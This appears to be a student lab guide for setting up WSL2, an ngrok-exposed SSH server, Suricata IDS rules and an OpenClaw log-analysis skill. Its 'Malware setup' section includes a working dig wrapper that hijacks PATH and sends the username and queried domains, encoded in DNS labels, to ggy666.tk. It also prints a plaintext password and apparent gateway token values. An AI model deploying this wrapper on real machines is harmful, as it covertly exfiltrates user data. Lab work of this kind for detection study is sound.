# 1. Set Up the WSL2 Environment on the Server Side

## 1.1 WSL2 and Ubuntu Setup

1. Open PowerShell as Administrator.

Search for `PowerShell` from the Start menu. Right-click it and select **Run as administrator**.

2. Check the available Ubuntu versions.

```bash
wsl --list --online
```

You should see something similar to the following:

```bash
NAME                               FRIENDLY NAME
Ubuntu                             Ubuntu
Ubuntu-26.04                       Ubuntu 26.04 LTS
Ubuntu-24.04                       Ubuntu 24.04 LTS
Ubuntu-22.04                       Ubuntu 22.04 LTS
openSUSE-Tumbleweed                openSUSE Tumbleweed
openSUSE-Leap-16.0                 openSUSE Leap 16.0
SUSE-Linux-Enterprise-15-SP7       SUSE Linux Enterprise 15 SP7
SUSE-Linux-Enterprise-16.0         SUSE Linux Enterprise 16.0
kali-linux                         Kali Linux Rolling
Debian                             Debian GNU/Linux
AlmaLinux-8                        AlmaLinux OS 8
AlmaLinux-9                        AlmaLinux OS 9
AlmaLinux-Kitten-10                AlmaLinux OS Kitten 10
AlmaLinux-10                       AlmaLinux OS 10
archlinux                          Arch Linux
FedoraLinux-44                     Fedora Linux 44
FedoraLinux-43                     Fedora Linux 43
eLxr                               eLxr 12.12.0.0 GNU/Linux
OracleLinux_7_9                    Oracle Linux 7.9
OracleLinux_8_10                   Oracle Linux 8.10
OracleLinux_9_5                    Oracle Linux 9.5
SUSE-Linux-Enterprise-15-SP6       SUSE Linux Enterprise 15 SP6
```

3. Install Ubuntu.

The Ubuntu installation command is:

```bash
wsl --install -d Ubuntu-xxxx
```

Replace `xxxx` with the version number shown in the available distribution list.

4. Create the `student` user.

Username:

```bash
student
```

Password:

```bash
user745
```

5. Verify the WSL2 environment.

Open a new PowerShell window and run:

```bash
wsl -l -v
```

If you see something similar to the following:

```bash
NAME            STATE           VERSION
Ubuntu-xxxx     Running         2
```

it means the installation was successful and the system is running on WSL2.

If the `VERSION` shows `1`, run:

```bash
wsl --set-version Ubuntu-xxx 2
```

## 1.2 Install the SSH Service

1. Install OpenSSH Server.

Run the following commands inside WSL2:

```bash
sudo apt update
sudo apt install openssh-server -y
```

2. Start the SSH service.

```bash
sudo service ssh start
```

Check the SSH service status:

```bash
sudo service ssh status
```

If you see something similar to:

```bash
sshd is running
```

it means the SSH server has started successfully.

## 1.3 Install and Configure Ngrok

1. Install the required basic tools.

Run the following command inside Ubuntu:

```bash
sudo apt update
sudo apt install curl unzip -y
```

2. Install ngrok.

It is recommended to install ngrok using the official apt repository. The official ngrok Linux download page provides the Linux installation method and authtoken configuration steps.

2.1 Run the following command inside WSL Ubuntu:

```bash
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
| sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
```

2.2 Add the ngrok apt repository:

```bash
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
| sudo tee /etc/apt/sources.list.d/ngrok.list
```

2.3 Update the package list and install ngrok:

```bash
sudo apt update
sudo apt install ngrok -y
```

3. Check the ngrok version.

```bash
ngrok version
```

4. Log in to your ngrok account and configure the authtoken.

Register or log in to the ngrok website, then copy your authtoken from the dashboard.

Run the following command inside WSL Ubuntu:

```bash
ngrok config add-authtoken <TOKEN>
```

The official ngrok documentation states that the ngrok agent requires an authtoken for authentication. The command format is:

```bash
ngrok config add-authtoken <TOKEN>
```

## 1.4 Configure the Required Python Dependencies on the Server Side

The server-side files are located in:

```bash
/remote_connect/ngrok/server/
```

1. Install the dependencies.

```bash
pip install requests pymongo python-dotenv
```

Or:

```bash
pip3 install requests pymongo python-dotenv
```

2. Configure the secret key.

In `consts.py`, find `MONGO_URI` and add the connection string for MongoDB Atlas.

3. Start the service.

```bash
python3 ngrok.py
```

Or:

```bash
python ngrok.py
```

# 2. Client-Side Configuration

The client-side files are located in:

```bash
/remote_connect/ngrok/client/
```

1. Install the dependencies.

```bash
pip install requests pymongo python-dotenv
```

Or:

```bash
pip3 install requests pymongo python-dotenv
```

2. Configure the secret key.

In `consts.py`, find `MONGO_URI` and add the connection string for MongoDB Atlas.

3. Start the service.

```bash
python3 ssh.py
```

Or:

```bash
python ssh.py
```

# 3. IDS and Software Installation on the Server Side

## 3.1 Suricata Setup in WSL2

Install Suricata and required packages:

```bash
sudo apt update
sudo apt install -y software-properties-common
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt update
sudo apt install -y suricata jq
```

Check the installed Suricata version:

```bash
suricata --build-info
```

Add the custom rule file:

```bash
sudo vim /etc/suricata/suricata.yaml
```

In Vim, use `/` to search for the `rule-files` section.

Search keyword:

```text
rule-files
```

Modify `default-rule-path`:

```text
default-rule-path: /home/student/745_project
```

Comment out the original rule file:

```text
# - suricata.rules
```

Add the custom rule file:

```text
- dns_attack.rules
```

## 3.2 Install and Configure OpenClaw in WSL2

1. Prepare the Environment

Install the required dependencies:

```bash
sudo apt update
sudo apt install -y curl ca-certificates git
```

Check whether WSL2 is using `systemd`:

```bash
ps -p 1 -o comm=
```

Expected output:

```text
systemd
```

If the output is not `systemd`, enable it by editing the WSL configuration file:

```bash
sudo nano /etc/wsl.conf
```

Add the following content:

```bash
[boot]
systemd=true
```

Then, in Windows PowerShell, run:

```powershell
wsl --shutdown
```

Restart WSL2 after running the command.

2. Install OpenClaw

Install OpenClaw using the official installation script:

```bash
curl -fsSL https://openclaw.ai/install.sh | bash
```

3. Verify the OpenClaw Installation

Check the OpenClaw gateway status:

```bash
openclaw gateway status
```

If the output shows:

```text
openclaw: command not found
```

Run the following commands to reload the shell environment and fix the OpenClaw command path:

```bash
source ~/.bashrc
hash -r
which openclaw
```
4. Slack and OpenClaw Integration

Refer: [https://www.youtube.com/watch?v=gOUbJA9YFiE&t=94s]

5. OpenClaw Skills Configuration

To configure the OpenClaw skill, provide the following prompt directly to OpenClaw:

```text
Please read this file:

~/745_project/analysis.md

This file contains the reference material/specification for an IDS/security log analysis workflow. I want you to turn it into a reusable OpenClaw skill.

Create the skill here:

~/.openclaw/workspace/skills/ids-analysis/SKILL.md

Requirements:

1. Create any missing directories.

2. Create a valid OpenClaw skill named `ids-analysis`.

3. The `SKILL.md` file must include YAML frontmatter:

name: ids-analysis
description: Analyze IDS, SIEM, Suricata, Zeek, firewall, DNS, and security logs with cautious SOC-style reporting.

4. Use the content from `~/745_project/analysis.md` as the source material, but rewrite it into a clean skill instruction file instead of blindly copying everything.

5. The skill should instruct the agent to:
- Act as a SOC analyst.
- Analyze IDS, SIEM, Suricata, Zeek, firewall, DNS, and general security logs.
- Support a single log file, multiple log files, a directory of logs, or raw pasted log content.
- Identify suspicious or benign behavior.
- Extract key evidence such as source IP, destination IP, port, protocol, timestamp, alert signature, domain, URL, frequency, and indicators.
- Clearly separate evidence from inference.
- Avoid claiming confirmed compromise unless the logs prove it.
- Explain limitations of the available evidence.
- Provide practical mitigation recommendations.
- Start the final analysis with `[GPT analyzed]:`.

6. If useful, copy the original source document into:

~/.openclaw/workspace/skills/ids-analysis/references/analysis.md

Then make `SKILL.md` mention that this reference should be read when more detail is needed.

7. After creating the skill, verify that:
- `~/.openclaw/workspace/skills/ids-analysis/SKILL.md` exists.
- The YAML frontmatter is valid.
- The skill description is clear enough for the agent to trigger it for IDS/log analysis tasks.

8. Finally, tell me:
- Which files you created.
- Whether the skill is ready to use.
- The exact prompt I should use later to analyze a log file with this skill.

```
use command to find gateway token:
```bash
grep -n "073178fb4b5404b44628e5c8e8ffd71543a5fa788c8aa5e2\|324c4f337b36cdbc406ef689f309ee5d401e07e7e5c619892972a354f09d2694\|gateway\|token\|auth\|secret" /home/student/.openclaw/openclaw.json
```
Run the test procedue:

```bash
openclaw gateway restart
```

```bash
python3 ids_monitor.py
```

```bash
sudo rm -f fast.log eve.json stats.log && sudo suricata -r ~/745_project/iodine-txt.pcap
```

# 4 Malware setup for Server& Client sides

## 4.1 Malware setup for DNS Server(Windows side)

1. Install the dependencies
```bash
pip install dnslib
```

or 

```bash
pip3 install dnslib
```
2. Run fake DNS server

```bash
python .\fake_dns_server.py
```

or

```bash
python3 .\fake_dns_server.py
```
## 4.2 Malware Setup for Client Side (WSL2)

### 1. Identify the Windows Gateway IP

Run the following commands in WSL2:

```bash
ip route | grep default
cat /etc/resolv.conf
```

Pay attention to the following output:

```bash
default via X.X.X.X dev eth0
```

or:

```bash
nameserver X.X.X.X
```

The `X.X.X.X` value is the Windows gateway IP that should be used by the current `dig` command or wrapper.

### 2. Create the Wrapper

```bash
mkdir -p ~/.local/bin
nano ~/.local/bin/dig
```

Add the following content:

```bash
#!/bin/bash

REAL_DIG="/usr/bin/dig"

DNS_SERVER="<Windows gateway IP>"
# If Windows 53 has been engaged, use 5300 to replace
DNS_PORT="53"
DOMAIN="ggy666.tk"

ORIGINAL_DOMAIN="$1"

if [[ -z "$ORIGINAL_DOMAIN" ]]; then
    exec "$REAL_DIG"
fi

# Only include short data to avoid DNS labels becoming too long
DATA="u=$(whoami),q=${ORIGINAL_DOMAIN}"

ENCODED=$(echo -n "$DATA" | base64 | tr '+/' '-_' | tr -d '=')

# Important: split the encoded string every 40 characters
# to avoid a single DNS label exceeding 63 characters
CHUNKED=$(echo "$ENCODED" | fold -w 40 | paste -sd "." -)

NEW_QUERY="${CHUNKED}.${ORIGINAL_DOMAIN}.${DOMAIN}"

echo "[WRAPPER] original query: $ORIGINAL_DOMAIN"
echo "[WRAPPER] modified query: $NEW_QUERY"

exec "$REAL_DIG" @"$DNS_SERVER" -p "$DNS_PORT" "$NEW_QUERY" TXT +short
```

After saving the file, run:

```bash
chmod +x ~/.local/bin/dig
```

### 3. Make Sure the Wrapper Runs First

Run:

```bash
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc
```

Check the current `dig` path:

```bash
which dig
```

You should see:

```bash
/home/<username>/.local/bin/dig
```

The real `dig` command is still located at:

```bash
/usr/bin/dig
```

### 4. Test the Wrapper

Now run the following command in WSL2:

```bash
dig google.com
```

The wrapper will modify the query into something similar to:

```text
base64data.google.com.ggy666.tk
```

Then it will send the request to the `Fake DNS Server` or the `Poisoned DNS Server`.

### 5. Restore the Original `dig`

Remove the wrapper directly:

```bash
rm ~/.local/bin/dig
```

Then reload the shell configuration:

```bash
source ~/.bashrc
```

Check the `dig` path again:

```bash
which dig
```

It should be restored to:

```bash
/usr/bin/dig
```

# 5 Starting Suricata for Real-Time Monitoring

1. Confirm the Network Interface

First, check the network interfaces:

```bash
ip a
```

In WSL2, the interface is usually:

```bash
eth0
```

So in most cases, you will monitor `eth0`.

2. Test the Configuration and Rules

Run a syntax test first:

```bash
sudo suricata -T -c /etc/suricata/suricata.yaml
```

If you see output similar to the following:

```bash
Configuration provided was successfully loaded. Exiting.
```

it means the configuration and rules are correct.

3. Start Real-Time Monitoring

```bash
sudo rm -f fast.log eve.json stats.log && sudo suricata -i eth0 -c /etc/suricata/suricata.yaml
```

This runs Suricata in the foreground. You will see Suricata start listening, and the terminal will be occupied while it is running.
